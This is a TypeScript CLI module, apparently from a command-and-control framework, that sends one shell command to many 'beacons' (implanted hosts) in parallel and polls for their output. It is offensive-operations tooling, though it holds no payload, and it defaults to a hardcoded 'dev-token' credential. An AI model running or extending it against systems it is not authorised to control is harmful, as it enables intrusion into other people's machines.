/**
 * octoctl bulk shell
 *
 * Queue a shell task on multiple beacons simultaneously (fire-and-forget).
 * Does NOT poll for results — tasks are queued and the table of task IDs is printed.
 *
 * Usage:
 *   octoctl bulk shell --beacon-ids <id1,id2,id3> --cmd "whoami"
 *   octoctl bulk shell --beacon-ids <id1,id2,id3> --cmd "id" --json
 */

// ── Types ──────────────────────────────────────────────────────────────────────

export interface BulkShellOptions {
  beaconIds:    string[];         // resolved full beacon IDs
  cmd:          string;           // shell command to queue
  serverUrl:    string;           // C2 server base URL
  token:        string;           // bearer token
  json?:        boolean;          // output as JSON
  wait?:        boolean;          // poll for results after queueing
  pollTimeout?: number;           // seconds before giving up (default 60)
}

export interface BulkShellResult {
  beaconId: string;
  taskId:   string | null;
  error:    string | null;
}

// ── ANSI helpers ───────────────────────────────────────────────────────────────

const GREEN = "\x1b[32m";
const RED   = "\x1b[31m";
const RESET = "\x1b[0m";
const BOLD  = "\x1b[1m";
const DIM   = "\x1b[2m";

// ── Core helpers (exported for testing) ────────────────────────────────────────

/**
 * POST a shell task to /api/beacon/:id/task and return the taskId string.
 * Throws on non-2xx responses.
 */
export async function postBulkTask(
  serverUrl: string,
  beaconId:  string,
  token:     string,
  cmd:       string,
): Promise<string> {
  const resp = await fetch(`${serverUrl}/api/beacon/${beaconId}/task`, {
    method:  "POST",
    headers: {
      Authorization:  `Bearer ${token}`,
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ kind: "shell", args: { cmd } }),
  });

  if (!resp.ok) {
    const text = await resp.text().catch(() => resp.statusText);
    throw new Error(`${resp.status} ${text}`);
  }

  const data = (await resp.json()) as { taskId?: string; id?: string };
  const taskId = data.taskId ?? data.id;
  if (!taskId) {
    throw new Error("Server did not return a taskId");
  }
  return taskId;
}

/**
 * Queue shell tasks on all provided beacon IDs in parallel.
 * Errors per-beacon are captured and returned rather than thrown.
 */
export async function runBulkShellQueue(opts: BulkShellOptions): Promise<BulkShellResult[]> {
  return Promise.all(
    opts.beaconIds.map(async (beaconId): Promise<BulkShellResult> => {
      try {
        const taskId = await postBulkTask(opts.serverUrl, beaconId, opts.token, opts.cmd);
        return { beaconId, taskId, error: null };
      } catch (err) {
        return { beaconId, taskId: null, error: (err as Error).message };
      }
    }),
  );
}

// ── Poll helpers ───────────────────────────────────────────────────────────────

interface TaskResultPayload {
  taskId?:     string;
  id?:         string;
  status?:     string;
  result?:     { output?: string; success?: boolean } | string | null;
  completedAt?: string | null;
}

function extractPollOutput(result: TaskResultPayload["result"]): string {
  if (!result) return "";
  if (typeof result === "string") return result;
  if (typeof result === "object" && "output" in result) {
    return String(result.output ?? "");
  }
  return "";
}

/**
 * Poll /api/beacon/:id/results for each queued task until all are done
 * (status === "completed" | "failed") or until `pollTimeout` seconds elapse.
 *
 * Prints output for each task as it arrives. At the end prints a summary line.
 *
 * Exported for testing — caller provides `sleepFn` to control timing in tests.
 */
export async function pollBulkResults(
  results: BulkShellResult[],
  opts: Pick<BulkShellOptions, "serverUrl" | "token"> & {
    pollTimeout?: number;
    sleepFn?: (ms: number) => Promise<void>;
  },
): Promise<{ completed: number; total: number }> {
  const timeoutMs = (opts.pollTimeout ?? 60) * 1000;
  const sleep     = opts.sleepFn ?? ((ms: number) => new Promise(r => setTimeout(r, ms)));
  const deadline  = Date.now() + timeoutMs;

  // Only track beacons that successfully queued a task
  const pending = results
    .filter(r => r.taskId !== null && r.error === null)
    .map(r => ({ beaconId: r.beaconId, taskId: r.taskId! }));

  const done = new Set<string>(); // beaconIds that have finished

  while (done.size < pending.length && Date.now() < deadline) {
    for (const entry of pending) {
      if (done.has(entry.beaconId)) continue;

      try {
        const resp = await fetch(
          `${opts.serverUrl}/api/beacon/${entry.beaconId}/results`,
          { headers: { Authorization: `Bearer ${opts.token}` } },
        );
        if (!resp.ok) continue;

        const tasks = (await resp.json()) as TaskResultPayload[];
        const task  = tasks.find(
          t => (t.taskId ?? t.id) === entry.taskId,
        );
        if (!task) continue;

        const status = task.status ?? "";
        if (status === "completed" || status === "failed") {
          done.add(entry.beaconId);
          const shortId = entry.beaconId.slice(0, 12);
          const output  = extractPollOutput(task.result);
          const marker  = status === "completed" ? `${GREEN}✓${RESET}` : `${RED}✗${RESET}`;
          console.log(`  ${marker} ${shortId.padEnd(14)}  ${output || DIM + "(no output)" + RESET}`);
        }
      } catch {
        // transient fetch error — keep polling
      }
    }

    if (done.size < pending.length && Date.now() < deadline) {
      await sleep(2000);
    }
  }

  const total     = pending.length;
  const completed = done.size;
  console.log(`\n  ${completed}/${total} beacons returned output\n`);
  return { completed, total };
}

// ── Main entrypoint ────────────────────────────────────────────────────────────

export async function runBulkShell(rawOpts: {
  beaconIds:    string;          // comma-separated string from CLI
  cmd:          string;
  serverUrl?:   string;
  token?:       string;
  json?:        boolean;
  wait?:        boolean;
  pollTimeout?: number;
}): Promise<void> {
  const serverUrl = rawOpts.serverUrl ?? process.env["OCTOC2_SERVER_URL"] ?? "";
  if (!serverUrl) {
    console.error("\n  Error: --server-url or OCTOC2_SERVER_URL env var is required for bulk shell.\n");
    process.exit(1);
  }

  const token = rawOpts.token ?? process.env["OCTOC2_DASHBOARD_TOKEN"] ?? "dev-token";

  const beaconIds = rawOpts.beaconIds
    .split(",")
    .map(id => id.trim())
    .filter(id => id.length > 0);

  if (beaconIds.length === 0) {
    console.error("\n  Error: --beacon-ids must be a non-empty comma-separated list.\n");
    process.exit(1);
  }

  const results = await runBulkShellQueue({
    beaconIds,
    cmd: rawOpts.cmd,
    serverUrl,
    token,
    json: rawOpts.json,
  });

  // ── JSON output ──────────────────────────────────────────────────────────────
  if (rawOpts.json) {
    console.log(JSON.stringify(results, null, 2));
    return;
  }

  // ── Human-readable table ──────────────────────────────────────────────────────
  console.log(`\n  ${BOLD}Bulk Shell${RESET} — ${DIM}cmd: ${rawOpts.cmd}${RESET}\n`);

  for (const r of results) {
    const shortId = r.beaconId.slice(0, 12);
    if (r.error) {
      console.log(`  ${shortId.padEnd(14)}  ${RED}✗ error  ${RESET}  ${r.error}`);
    } else {
      console.log(`  ${shortId.padEnd(14)}  ${GREEN}✓ queued ${RESET}  ${r.taskId ?? ""}`);
    }
  }

  console.log("");

  // ── Poll for results when --wait is set ───────────────────────────────────
  if (rawOpts.wait) {
    console.log(`  ${DIM}Waiting for results…${RESET}\n`);
    await pollBulkResults(results, {
      serverUrl,
      token,
      pollTimeout: rawOpts.pollTimeout,
    });
  }
}
